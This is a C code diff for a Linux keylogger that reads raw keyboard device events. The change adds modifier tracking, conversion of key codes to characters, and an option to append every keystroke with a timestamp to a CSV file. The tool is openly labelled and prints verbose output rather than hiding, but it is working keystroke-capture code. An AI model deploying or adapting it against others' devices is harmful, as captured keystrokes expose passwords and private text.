@@ -18,6 +18,9 @@
 #include <linux/input.h>
 #include <time.h>
 
+#include "constants.h"
+#include "keymap.h"
+
 #define SUCCESS 1
 #define FAILURE 0
 
@@ -101,6 +104,18 @@ void FreeInputEvents(struct input_event **p) {
   }
 
   free(*p);
+  *p = NULL;
+}
+
+void CloseFile(FILE **p) {
+  if (p == NULL || *p == NULL) {
+    return;
+  }
+
+  if (fclose(*p) == EOF) {
+    fprintf(stderr, "CloseFile: error closing file; error=%s\n", strerror(errno));
+  }
+
   *p = NULL;
 }
 
@@ -218,7 +233,91 @@ char* currtime() {
     return &buf[0];
 }
 
-int startKeylogger(KeyboardDevice *kbd) {
+long long currtime_ms() {
+  struct timespec ts;
+  clock_gettime(CLOCK_REALTIME, &ts);
+  return (long long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
+}
+
+// Writes a CSV field, quoting it (and escaping any embedded quotes) if it
+// contains a character -- like the comma or double-quote keys -- that would
+// otherwise be misread as CSV syntax.
+void csvWriteField(FILE *f, const char *s) {
+  int needs_quoting = 0;
+  for (const char *p = s; *p != '\0'; ++p) {
+    if (*p == ',' || *p == '"' || *p == '\n') {
+      needs_quoting = 1;
+      break;
+    }
+  }
+
+  if (!needs_quoting) {
+    fputs(s, f);
+    return;
+  }
+
+  fputc('"', f);
+  for (const char *p = s; *p != '\0'; ++p) {
+    if (*p == '"') {
+      fputc('"', f);
+    }
+    fputc(*p, f);
+  }
+  fputc('"', f);
+}
+
+typedef struct {
+  int shift;
+  int ctrl;
+  int alt;
+  int meta;
+} ModifierState;
+
+void updateModifierState(ModifierState *mods, unsigned int code, int value) {
+  int held = (value != KEY_RELEASED);
+  switch (code) {
+    case KEY_LEFTSHIFT:
+    case KEY_RIGHTSHIFT:
+      mods->shift = held;
+      break;
+    case KEY_LEFTCTRL:
+    case KEY_RIGHTCTRL:
+      mods->ctrl = held;
+      break;
+    case KEY_LEFTALT:
+    case KEY_RIGHTALT:
+      mods->alt = held;
+      break;
+    case KEY_LEFTMETA:
+    case KEY_RIGHTMETA:
+      mods->meta = held;
+      break;
+    default:
+      break;
+  }
+}
+
+// Writes the currently held modifiers, e.g. "SHIFT+CTRL", or "" if none are
+// held. buf is always left NUL-terminated.
+void modifierState_toString(const ModifierState *mods, char *buf, size_t buf_size) {
+  const char *parts[4];
+  int num_parts = 0;
+
+  if (mods->shift) parts[num_parts++] = "SHIFT";
+  if (mods->ctrl)  parts[num_parts++] = "CTRL";
+  if (mods->alt)   parts[num_parts++] = "ALT";
+  if (mods->meta)  parts[num_parts++] = "META";
+
+  buf[0] = '\0';
+  for (int ii = 0; ii < num_parts; ++ii) {
+    if (ii > 0) {
+      strncat(buf, "+", buf_size - strlen(buf) - 1);
+    }
+    strncat(buf, parts[ii], buf_size - strlen(buf) - 1);
+  }
+}
+
+int startKeylogger(KeyboardDevice *kbd, FILE *output) {
   size_t event_size = sizeof(struct input_event);
   defer(FreeInputEvents) struct input_event *kbd_events = malloc(event_size * MAX_EVENTS);
   if (kbd_events == NULL) {
@@ -237,6 +336,7 @@ int startKeylogger(KeyboardDevice *kbd) {
   sigaction(SIGTERM, &sa, NULL);
   sigaction(SIGPIPE, &sa, NULL);
 
+  ModifierState mods = {0, 0, 0, 0};
 
   while (!STOP_KEYLOGGER) {
     errno = 0;
@@ -290,14 +390,51 @@ int startKeylogger(KeyboardDevice *kbd) {
 
     for (ssize_t ii = 0; ii < numEventsRead; ++ii) {
       if (kbd_events[ii].type == EV_KEY) {
-        printf("%s|read key: code=%d; value=%d; type=%d\n", currtime(),
+        const char *code_name = input_event_code_name(kbd_events[ii].type, kbd_events[ii].code);
+        const char *type_name = input_event_type_name(kbd_events[ii].type);
+        const char *value_name = input_event_value_name(kbd_events[ii].type, kbd_events[ii].value);
+        char *ts = currtime();
+
+        updateModifierState(&mods, kbd_events[ii].code, kbd_events[ii].value);
+        char modifiers[32];
+        modifierState_toString(&mods, modifiers, sizeof(modifiers));
+
+        char quoted_key[8] = "";
+        char ch = key_to_char(kbd_events[ii].code, mods.shift);
+        if (ch != '\0') {
+          snprintf(quoted_key, sizeof(quoted_key), "'%c'", ch);
+        }
+
+        printf("%s|read key: code=%s (%d); value=%s (%d); type=%s (%d); modifiers=%s; key=%s\n", ts,
+               code_name,
                kbd_events[ii].code,
+               value_name != NULL ? value_name : "?",
                kbd_events[ii].value,
-               kbd_events[ii].type
+               type_name,
+               kbd_events[ii].type,
+               modifiers,
+               quoted_key
               );
+
+        if (output != NULL) {
+          fprintf(output, "%lld,%d,%s,%d,%s,%d,%s,%s,",
+                  currtime_ms(),
+                  kbd_events[ii].type,
+                  type_name,
+                  kbd_events[ii].code,
+                  code_name,
+                  kbd_events[ii].value,
+                  value_name != NULL ? value_name : "",
+                  modifiers);
+          csvWriteField(output, quoted_key);
+          fputc('\n', output);
+        }
       }
     }
 
+    if (output != NULL) {
+      fflush(output);
+    }
   }
 
   return SUCCESS;
@@ -306,7 +443,7 @@ int startKeylogger(KeyboardDevice *kbd) {
 
 void FreeString(char **p) {
   if (p != NULL && *p != NULL) {
-    free(p);
+    free(*p);
   }
   *p = NULL;
 }
@@ -324,8 +461,27 @@ KeyboardDevice* openKeyboardDevice(char *filepath) {
   return kbd;
 }
 
+FILE* openOutputFile(char *filepath) {
+  int exists = (access(filepath, F_OK) == 0);
+
+  FILE *output = fopen(filepath, "a");
+  if (output == NULL) {
+    fprintf(stderr, "%s|openOutputFile: Error opening file '%s' error:%s\n", currtime(),
+            filepath, strerror(errno));
+    return NULL;
+  }
+
+  if (!exists) {
+    fprintf(output, "timestamp_ms,type,type_name,code,code_name,value,value_name,modifiers,key\n");
+    fflush(output);
+  }
+
+  return output;
+}
+
 int main (int argc, char **argv) {
   defer(FreeString) char *event_file = NULL;
+  defer(FreeString) char *output_file = NULL;
   for (int ii = 0; ii < argc; ++ii) {
     printf("%s|main: argv[%02d]=%s\n", currtime(), ii, argv[ii]);
     if (0 == strncmp(argv[ii], "--file=", strlen("--file="))) {
@@ -336,6 +492,15 @@ int main (int argc, char **argv) {
       }
       event_file = malloc((strlen(start)+1) * sizeof(char));
       strcpy(event_file, start);
+    }
+    if (0 == strncmp(argv[ii], "--output=", strlen("--output="))) {
+      char *start = argv[ii] + strlen("--output=");
+      if (*start == '\0') {
+        fprintf(stderr, "%s|main: Error you must pass an argument to '--output='\n", currtime());
+        return 1;
+      }
+      output_file = malloc((strlen(start)+1) * sizeof(char));
+      strcpy(output_file, start);
     }
   }
 
@@ -353,7 +518,16 @@ int main (int argc, char **argv) {
   }
   printf("%s|main: keyboard at: fd=%d, path=%s\n", currtime(), kbd->fd, kbd->path);
 
-  if (startKeylogger(kbd) == FAILURE) {
+  defer(CloseFile) FILE *output = NULL;
+  if (output_file != NULL) {
+    output = openOutputFile(output_file);
+    if (output == NULL) {
+      fprintf(stderr, "%s|main: unable to open output file '%s'\n", currtime(), output_file);
+      return FAILURE;
+    }
+  }
+
+  if (startKeylogger(kbd, output) == FAILURE) {
     fprintf(stderr, "%s|main: error running keylogger\n", currtime());
     return FAILURE;
   }
